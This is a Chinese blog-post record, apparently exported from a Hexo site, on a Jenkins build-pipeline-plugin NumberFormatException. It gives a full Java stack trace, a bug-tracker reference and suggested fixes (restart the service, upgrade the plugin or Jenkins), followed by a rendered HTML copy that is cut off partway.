org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 111 more\n```\n\n\n## 解决方案\n1. 重启jenkins服务(自己发现的)\n服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。\n\n2. 尝试升级build-pipeline-plugin。\n\n3. 尝试升级jenkins版本。","source":"_posts/article/jenkins/jenkins插件buildpipeline数值解析异常.md","raw":"categories:\n  - 持续集成\ntags:\n  - issue\n  - jenkins\ntitle: jenkins build-pipeline-plugin 数值解析异常\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\njenkins version: 1.574\n\n## 问题分析\n这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。\n目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。\n\n**参考**：[Jenkins gives strack trace on main page](https://issues.jenkins-ci.org/browse/JENKINS-24102)\n\n<!-- more -->\n\n## 异常堆栈\n遇到的异常堆栈内容如下：\n``` java\nA problem occurred while processing the request. Please check our bug tracker to see if a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think this is a new issue, please file a new issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.\n\nStack trace\n\njavax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:117)\n\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:127)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:717)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:795)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:631)\n\tat org.kohsuke.stapler.Stapler.service(Stapler.java:225)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:848)\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:686)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1494)\n\tat hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:96)\n\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:88)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:48)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\n\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:51)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:117)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:125)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:142)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:271)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:174)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:79)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:249)\n\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:67)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\n\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:164)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:46)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1474)\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:499)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:533)\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1086)\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:428)\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1020)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\n\tat org.eclipse.jetty.server.Server.handle(Server.java:370)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:489)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:949)\n\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:1011)\n\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:644)\n\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)\n\tat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:668)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)\n\tat winstone.BoundedExecutorService$1.run(BoundedExecutorService.java:77)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:626)\n\tat java.lang.Thread.run(Thread.java:804)\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:44)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:81)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:63)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:53)\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:112)\n\t... 63 more\nCaused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:280)\n\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:92)\n\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)\n\tat lib.JenkinsTagLib$projectView.call(Unknown Source)\n\tat hudson.model.View.main.run(main.groovy:14)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:74)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:62)\n\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:147)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 95 more\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:276)\n\t... 103 more\nCaused by: java.lang.NumberFormatException: null\n\tat java.lang.Integer.parseInt(Integer.java:465)\n\tat java.lang.Integer.valueOf(Integer.java:593)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:400)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:866)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:932)\n\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:115)\n\tat jenkins.model.Jenkins.getViews(Jenkins.java:1444)\n\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:3500)\n\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:61)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:227)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:15)\n\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:66)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:141)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)\n\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat groovy.lang.Closure.call(Closure.java:415)\n\tat groovy.lang.Closure.call(Closure.java:409)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$1.run(JellyBuilder.java:264)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 111 more\n```\n\n\n## 解决方案\n1. 重启jenkins服务(自己发现的)\n服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。\n\n2. 尝试升级build-pipeline-plugin。\n\n3. 尝试升级jenkins版本。","slug":"article/jenkins/jenkins插件buildpipeline数值解析异常","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsh003u5nbtdnm19v4d","content":"<p><img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\"></p>\n<p>jenkins version: 1.574</p>\n<h2 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h2><p>这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。<br>目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。</p>\n<p><strong>参考</strong>：<a href=\"https://issues.jenkins-ci.org/browse/JENKINS-24102\" target=\"_blank\" rel=\"external\">Jenkins gives strack trace on main page</a></p>\n<a id=\"more\"></a>\n<h2 id=\"异常堆栈\"><a href=\"#异常堆栈\" class=\"headerlink\" title=\"异常堆栈\"></a>异常堆栈</h2><p>遇到的异常堆栈内容如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div></pre></td><td class=\"code\"><pre><div class=\"line\">A problem occurred <span class=\"keyword\">while</span> processing the request. Please check our bug tracker to see <span class=\"keyword\">if</span> a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think <span class=\"keyword\">this</span> is a <span class=\"keyword\">new</span> issue, please file a <span class=\"keyword\">new</span> issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.</div><div class=\"line\"></div><div class=\"line\">Stack trace</div><div class=\"line\"></div><div class=\"line\">javax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/hudson/model/View/index.jelly:<span class=\"number\">42</span>:<span class=\"number\">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class=\"number\">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class=\"number\">66</span>:<span class=\"number\">22</span>: &lt;d:invokeBody&gt; <span class=\"keyword\">null</span></div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class=\"number\">117</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:<span class=\"number\">127</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class=\"number\">717</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">858</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class=\"number\">795</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">858</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class=\"number\">631</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.Stapler.service(Stapler.java:<span class=\"number\">225</span>)</div><div class=\"line\">\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:<span class=\"number\">848</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:<span class=\"number\">686</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1494</span>)</div><div class=\"line\">\tat hudson.util.PluginServletFilter$<span class=\"number\">1</span>.doFilter(PluginServletFilter.java:<span class=\"number\">96</span>)</div><div class=\"line\">\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:<span class=\"number\">88</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:<span class=\"number\">48</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">84</span>)</div><div class=\"line\">\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:<span class=\"number\">51</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:<span class=\"number\">117</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:<span class=\"number\">125</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:<span class=\"number\">142</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:<span class=\"number\">271</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:<span class=\"number\">174</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:<span class=\"number\">79</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:<span class=\"number\">249</span>)</div><div class=\"line\">\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:<span class=\"number\">67</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter$<span class=\"number\">1</span>.doFilter(ChainedServletFilter.java:<span class=\"number\">87</span>)</div><div class=\"line\">\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:<span class=\"number\">76</span>)</div><div class=\"line\">\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:<span class=\"number\">164</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:<span class=\"number\">46</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1482</span>)</div><div class=\"line\">\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:<span class=\"number\">81</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class=\"number\">1474</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:<span class=\"number\">499</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class=\"number\">137</span>)</div><div class=\"line\">\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:<span class=\"number\">533</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:<span class=\"number\">231</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:<span class=\"number\">1086</span>)</div><div class=\"line\">\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:<span class=\"number\">428</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:<span class=\"number\">193</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:<span class=\"number\">1020</span>)</div><div class=\"line\">\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class=\"number\">135</span>)</div><div class=\"line\">\tat 